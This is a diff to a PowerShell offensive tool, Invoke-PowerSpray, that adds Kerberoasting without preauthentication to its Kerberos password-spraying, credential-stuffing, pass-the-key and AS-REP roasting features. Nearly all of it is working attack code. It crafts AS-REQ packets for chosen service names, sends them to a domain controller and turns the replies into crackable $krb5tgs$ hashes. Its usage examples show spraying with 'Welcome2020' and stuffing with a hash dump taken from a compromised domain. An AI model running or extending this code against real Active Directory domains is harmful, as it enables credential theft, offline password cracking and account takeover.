@@ -10,6 +10,7 @@ Function Invoke-PowerSpray {
     Spraying attack can be performed against all the domain users retrieved from LDAP directory, while checking their "badPwdCount" attribute to prevent account lockout and identify previous passwords.
     Stuffing attack can be performed using NTLM password hashes dumped from a compromised domain against another target domain in order to identify credential reuse.
     Since failing Kerberos preauthentication does not trigger traditional logon failure event, it is a stealthy way to credential guessing.
+    Moreover, roasting attacks can be performed to retrieve encrypted material via users that do not have preauthentication required.
     It is highly inspired from Rubeus (by @harmj0y) for the Kerberos part and from Invoke-BadPwdCountScanner (by @rindert-fox) for the LDAP part.
 
 .PARAMETER Username
@@ -74,21 +75,31 @@ Function Invoke-PowerSpray {
     Specifies Neo4j server port.
 
 .EXAMPLE
+    Discovering valid usernames, from an unauthenticated context:
     PS C:\> Invoke-PowerSpray -Server 192.168.1.10 -UserFile .\users.lst
 
 .EXAMPLE
+    Kerberoasting using a given account without preauthentication enabled, from an unauthenticated context:
+    PS C:\> Invoke-PowerSpray -Server 192.168.1.10 -UserName testuser -ServiceList .\services.lst -EncType RC4
+
+.EXAMPLE
+    ASREP roasting and Kerberoasting using AS-REQ without preauthentication data, from an authenticated context:
     PS C:\> Invoke-PowerSpray -Ldap -EncType RC4
 
 .EXAMPLE
+    Password spraying against all domain users using username as password:
     PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -UserAsPassword -BloodHound -Neo4jCredential neo4j
 
 .EXAMPLE
+    Perform spraying attack against all domain users using a given password:
     PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -LdapCredential testuser@ADATUM.CORP -Password 'Welcome2020'
 
 .EXAMPLE
+    Pass-the-key attack targeting a specific account using a given password hash:
     PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -UserName testuser -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
 
 .EXAMPLE
+    Password stuffing using a hash dump extracted from a previously compromised domain:
     PS C:\> Invoke-PowerSpray -Server ADATUM.CORP -DumpFile .\CONTOSO.ntds -Threads 5
 #>
 
@@ -96,11 +107,19 @@ Function Invoke-PowerSpray {
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
-        $Username,
+        $UserName,
 
         [ValidateScript({Test-Path $_ -PathType Leaf})]
         [String]
         $UserFile,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ServiceName,
+
+        [ValidateScript({Test-Path $_ -PathType Leaf})]
+        [String]
+        $ServiceFile,
 
         [Switch]
         $EmptyPassword,
@@ -228,13 +247,32 @@ Function Invoke-PowerSpray {
         }
     }
 
+    $services = @()
+    if ($ServiceName) {
+        $services += $ServiceName
+    }
+    elseif ($ServiceFile) {
+        $ServiceFilePath = Resolve-Path -Path $ServiceFile
+        foreach ($serviceName in Get-Content $ServiceFilePath) {
+            if ($Ldap) {
+                $filter = "&((samAccountName=$serviceName)(servicePrincipalName=*))"
+                if (-not ($service = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential)) {
+                    Write-Verbose "$($userName)@$($domain) does not exist"
+                }
+            }
+            if ($service -or -not $Ldap) {
+                $services += $serviceName
+            }
+        }
+    }
+
     $badPwdCount = -1
     $user = $null
     $credentials = New-Object Collections.ArrayList
 
-    if ($Username) {
+    if ($UserName) {
         if ($Ldap) {
-            $filter = "(samAccountName=$Username)"
+            $filter = "(samAccountName=$UserName)"
             if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                 $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
             }
@@ -242,30 +280,30 @@ Function Invoke-PowerSpray {
                 $badPwdCount = $user.badPwdCount
             }
             else {
-                Write-Error "$($username)@$($domain) does not exist" -ErrorAction Stop
+                Write-Error "$($UserName)@$($domain) does not exist" -ErrorAction Stop
             }
         }
         if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
             switch ($UserAsPassword) {
                 lowercase {
-                    $pass = $Username.ToLower()
+                    $pass = $UserName.ToLower()
                 }
                 uppercase {
-                    $pass = $Username.ToUpper()
+                    $pass = $UserName.ToUpper()
                 }
                 default {
-                    $pass = $Username
+                    $pass = $UserName
                 }
             }
         }
-        $cred = [pscustomobject] @{Domain = $domain; Username = $Username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+        $cred = [pscustomobject] @{Domain = $domain; Username = $UserName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
         $credentials.add($cred) | Out-Null
     }
     elseif ($UserFile) {
         $UserFilePath = Resolve-Path -Path $UserFile
-        foreach ($username in Get-Content $UserFilePath) {
+        foreach ($userName in Get-Content $UserFilePath) {
             if ($Ldap) {
-                $filter = "(samAccountName=$username)"
+                $filter = "(samAccountName=$userName)"
                 if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                     $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
                 }
@@ -273,24 +311,24 @@ Function Invoke-PowerSpray {
                     $badPwdCount = $user.badPwdCount
                 }
                 else {
-                    Write-Verbose "$($username)@$($domain) does not exist"
+                    Write-Verbose "$($userName)@$($domain) does not exist"
                 }
             }
             if ($user -or -not $Ldap) {
                 if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
                     switch ($UserAsPassword) {
                         lowercase {
-                            $pass = $username.ToLower()
+                            $pass = $userName.ToLower()
                         }
                         uppercase {
-                            $pass = $username.ToUpper()
+                            $pass = $userName.ToUpper()
                         }
                         default {
-                            $pass = $username
+                            $pass = $userName
                         }
                     }
                 }
-                $cred = [pscustomobject] @{Domain = $domain; Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+                $cred = [pscustomobject] @{Domain = $domain; Username = $userName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
         }
@@ -299,13 +337,13 @@ Function Invoke-PowerSpray {
         $dumpFilePath = Resolve-Path -Path $DumpFile
         foreach ($line in Get-Content $dumpFilePath) {
             $dump = $line.Split(':')
-            $username = $dump[0]
-            if ($username) {
-                if ($username.Contains('\')) {
-                    $username = $username.split('\')[1]
+            $userName = $dump[0]
+            if ($userName) {
+                if ($userName.Contains('\')) {
+                    $userName = $userName.split('\')[1]
                 }
                 if ($Ldap) {
-                    $filter = "(samAccountName=$username)"
+                    $filter = "(samAccountName=$userName)"
                     if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                         $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
                     }
@@ -313,7 +351,7 @@ Function Invoke-PowerSpray {
                         $badPwdCount = $user.badPwdCount
                     }
                     else {
-                        Write-Verbose "$($username)@$($domain) does not exist"
+                        Write-Verbose "$($userName)@$($domain) does not exist"
                     }
                 }
                 if ($user -or -not $Ldap) {
@@ -322,17 +360,17 @@ Function Invoke-PowerSpray {
                         $nthash = $null
                         switch ($UserAsPassword) {
                             lowercase {
-                                $pass = $username.ToLower()
+                                $pass = $userName.ToLower()
                             }
                             uppercase {
-                                $pass = $username.ToUpper()
+                                $pass = $userName.ToUpper()
                             }
                             default {
-                                $pass = $username
+                                $pass = $userName
                             }
                         }
                     }
-                    $cred = [pscustomobject] @{Domain = $domain; Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+                    $cred = [pscustomobject] @{Domain = $domain; Username = $userName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                     $credentials.add($cred) | Out-Null
                 }
             }
@@ -346,8 +384,13 @@ Function Invoke-PowerSpray {
         }
         if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword'))) {
             # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
-            $filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
-            $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
+            $filter1 = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
+            $users = Get-LdapObject -ADSpath $adsPath -Filter $filter1 -Properties $properties -Credential $LdapCredential
+            if (($users | Measure-Object).Count -gt 0) {
+                # Find all enabled users with a SPN (Kerberoasting)
+                $filter2 = "(&(samAccountType=805306368)(servicePrincipalName=*)$filter)"
+                $services = (Get-LdapObject -ADSpath $adsPath -Filter $filter2 -Properties $properties -Credential $LdapCredential).sAMAccountName
+            }
         }
         else {
             # Find all enabled users with badPwdCount < LockoutThreshold (spraying)
@@ -397,6 +440,7 @@ Function Invoke-PowerSpray {
         Neo4jHost = $Neo4jHost
         Neo4jPort = $Neo4jPort
         Verbose = $VerbosePreference
+        Services = $services
     }
 
     if ($PSBoundParameters['Delay'] -or $credentials.Count -eq 1 -or $Threads -eq 1) {
@@ -454,7 +498,10 @@ Function Local:New-KerberosSpray {
         $Neo4jHost,
 
         [Int]
-        $Neo4jPort
+        $Neo4jPort,
+
+        [String[]]
+        $Services
     )
 
     switch ($EncType) {
@@ -475,6 +522,9 @@ Function Local:New-KerberosSpray {
             $eType = 23
         }
     }
+
+    $keyBytes = $null
+    $noPreauthUser = $null
 
     if ($CheckOldPwd) {
         $currentUser = ((Get-LdapCurrentUser -Server $Server -Credential $LdapCredential).Split('\\'))[1]
@@ -509,7 +559,8 @@ Function Local:New-KerberosSpray {
             $cred.PSObject.Properties.Remove('NTHash')
         }
 
-        $asn_AS_REP = New-KerbPreauth -EncType $eType -UserName $cred.Username -Key $keyBytes -Domain $cred.Domain -Server $Server
+        $AS_REP = New-KerbPreauth -EncType $eType -UserName $cred.Username -Key $keyBytes -Domain $cred.Domain -Server $Server
+        $asn_AS_REP = [Asn1.AsnElt]::Decode($AS_REP, $false)
         $tag = $asn_AS_REP.TagValue
 
         # ERR_PREAUTH_REQUIRED
@@ -626,7 +677,7 @@ Function Local:New-KerberosSpray {
         # AS-REP
         elseif ($tag -eq 11) {
             if ($cred.Password -eq $null -and $cred.NTHash -eq $null) {
-                $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'PreauthNotRequired'
+                $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'ASRepRoastable'
                 $cred.PSObject.Properties.Remove('BadPwdCount')
                 $encPart = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
                 $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 2}
@@ -636,7 +687,8 @@ Function Local:New-KerberosSpray {
                 $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 0}
                 $eType = $temp.Sub[0].GetInteger()
                 $hash = "`$krb5asrep`$$($eType)`$$($cred.Username)@$($cred.Domain):$($asrepHash)"
-                $cred | Add-Member -MemberType NoteProperty -Name 'KRB5ASRep' -Value $hash
+                $cred | Add-Member -MemberType NoteProperty -Name 'KRB5Hash' -Value $hash
+                $noPreauthUser = $cred # Store username for further Kerberoasting
             }
             else {
                 $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Valid'
@@ -674,6 +726,58 @@ Function Local:New-KerberosSpray {
         $waitingTime = $randNb.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
         Start-Sleep -Seconds $waitingTime
     }
+
+    if ($noPreauthUser) {
+        # Kerberoasting without preauthentication
+        foreach ($service in $Services) {
+            $serviceCred = [pscustomobject] @{Domain = $domain; Username = $service}
+            $AS_REP = New-KerbPreauth -EncType $eType -UserName $noPreauthUser.Username -Domain $noPreauthUser.Domain -Server $Server -ServiceName $service
+            $asn_AS_REP = [Asn1.AsnElt]::Decode($AS_REP, $false)
+            $tag = $asn_AS_REP.TagValue
+            if ($tag -eq 11) {
+                # TODO: use decoded Asn1 structure instead of parsing raw ticket
+                $ticketHexStream = [BitConverter]::ToString($AS_REP) -replace '-'
+                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
+                    #$eType = [Convert]::ToByte($Matches.EtypeLen, 16)
+                    $cipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16) - 4
+                    $cipherText = $Matches.DataToEnd.Substring(0, $cipherTextLen*2)
+                    $hashcat = $null
+                    if (($eType -eq 18) -or ($eType -eq 17)) {
+                        $checksumStart = $cipherTextLen - 24
+                        $hash = "$($cipherText.Substring($checksumStart))`$$($cipherText.Substring(0, $checksumStart))"
+                        $hashcat = "`$krb5tgs`$$($eType)`$$service`$$($serviceCred.Domain)`$*$service*`$$hash"
+                    }
+                    else {
+                        $hash = "$($cipherText.Substring(0, 32))`$$($cipherText.Substring(32))"
+                        $hashcat = "`$krb5tgs`$$($eType)`$*$service`$$($serviceCred.Domain)`$$service*`$$hash"
+                    }
+                    $serviceCred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'KerbeRoastable'
+                    $serviceCred | Add-Member -MemberType NoteProperty -Name 'KRB5Hash' -Value $hashcat
+                }
+            }
+            elseif ($tag -eq 30) {
+                $serviceCred | Add-Member -MemberType NoteProperty -Name 'KRB5Hash' -Value $null
+                $temp = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
+                $error_code = [Convert]::ToUInt32($temp.Sub[0].GetInteger())
+                switch ($error_code) {
+                    # KDC_ERR_S_PRINCIPAL_UNKNOWN
+                    7 {
+                        Write-Verbose "$($serviceCred.Username)@$($serviceCred.Domain) is not a valid service" 
+                        $serviceCred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Invalid'
+                    }
+                    # KDC_ERR_ETYPE_NOSUPP
+                    14 {
+                        $serviceCred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'ETypeNotSupported'
+                    }
+                    # https://tools.ietf.org/html/rfc1510#section-8.3
+                    default {
+                        Write-Warning "Unknown error code for '$($serviceCred.Username)@$($serviceCred.Domain): $error_code"
+                    }
+                }
+            }
+            Write-Output $serviceCred
+        }
+    }
 }
 
 Function Local:New-KerbPreauth {
@@ -681,11 +785,9 @@ Function Local:New-KerbPreauth {
     Param (
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
-        [Alias('User')]
         [String]
-        $Username,
+        $UserName,
 
-        [Parameter(Mandatory = $False)]
         [Byte[]]
         $Key,
 
@@ -703,14 +805,18 @@ Function Local:New-KerbPreauth {
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $Server
+        $Server,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ServiceName = 'krbtgt'
     )
 
     $Address = [Net.IPAddress]::Parse($Server)
     $EndPoint = New-Object Net.IPEndPoint $Address, 88
     $Socket = New-Object Net.Sockets.Socket ([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::TCP)
     $Socket.TTL = 128
-    $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType $EncType -Key $Key
+    $ASREQ = New-ASReq -UserName $UserName -Domain $Domain -EncType $EncType -Key $Key -ServiceName $ServiceName
     $LengthBytes = [BitConverter]::GetBytes($ASREQ.Length)
     [Array]::Reverse($LengthBytes)
     $totalRequestBytes  = $LengthBytes + $ASREQ
@@ -725,8 +831,7 @@ Function Local:New-KerbPreauth {
     catch {
         throw "Error sending AS-REQ to '$TargetDCIP' : $_"
     }
-    $ResponseData = $ResponseBuffer[4..$($BytesReceived-1)]
-    return [Asn1.AsnElt]::Decode($ResponseData, $false)
+    return $ResponseBuffer[4..$($BytesReceived-1)]
 }
 
 Function Local:New-ASReq {
@@ -734,9 +839,8 @@ Function Local:New-ASReq {
     Param (
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
-        [Alias('User')]
         [String]
-        $Username,
+        $UserName,
 
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
@@ -744,11 +848,14 @@ Function Local:New-ASReq {
         $Domain,
 
         [Parameter(Mandatory = $True)]
+        [String]
+        $ServiceName,
+
+        [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [UInt32]
         $EncType,
 
-        [Parameter(Mandatory = $False)]
         [Byte[]]
         $Key
     )
@@ -823,7 +930,7 @@ Function Local:New-ASReq {
     $cnameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameTypeElt))
     $cnameType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $cnameTypeSeq)
     #   name-string   [1] SEQUENCE OF KerberosString [List<string>]
-    $cnameStringElt = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::UTF8String, $Username)
+    $cnameStringElt = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::UTF8String, $UserName)
     $cnameStringElt = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $cnameStringElt)
     $cstringSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameStringElt))
     $cstringSeq2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cstringSeq))
@@ -840,16 +947,21 @@ Function Local:New-ASReq {
     $realm = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $realmSeq)
 
     # sname           [3] PrincipalName OPTIONAL ::= SEQUENCE
-    #   name-type     [0] Int32 (2 = KRB5-NT-SRV-INST)
-    $snameTypeElt = [Asn1.AsnElt]::MakeInteger(2)
+    #   name-type     [0] Int32 (1 = KRB5-NT-PRINCIPAL)
+    $snameTypeElt = [Asn1.AsnElt]::MakeInteger(1)
     $snameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameTypeElt))
     $snameType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $snameTypeSeq)
     #   name-string   [1] SEQUENCE OF KerberosString [List<string>]
-    $snameStringElt1 = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, 'krbtgt')
+    $snameStringElt1 = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, $ServiceName)
     $snameStringElt1 = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $snameStringElt1)
-    $snameStringElt2 = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, $Domain)
-    $snameStringElt2 = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $snameStringElt2)
-    $sstringSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameStringElt1, $snameStringElt2))
+    if ($ServiceName -eq 'krbtgt') {
+        $snameStringElt2 = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, $Domain)
+        $snameStringElt2 = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $snameStringElt2)
+        $sstringSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameStringElt1, $snameStringElt2))
+    }
+    else {
+        $sstringSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameStringElt1))
+    }
     $sstringSeq2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($sstringSeq))
     $snameString = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $sstringSeq2)
     # sname         ::= SEQUENCE
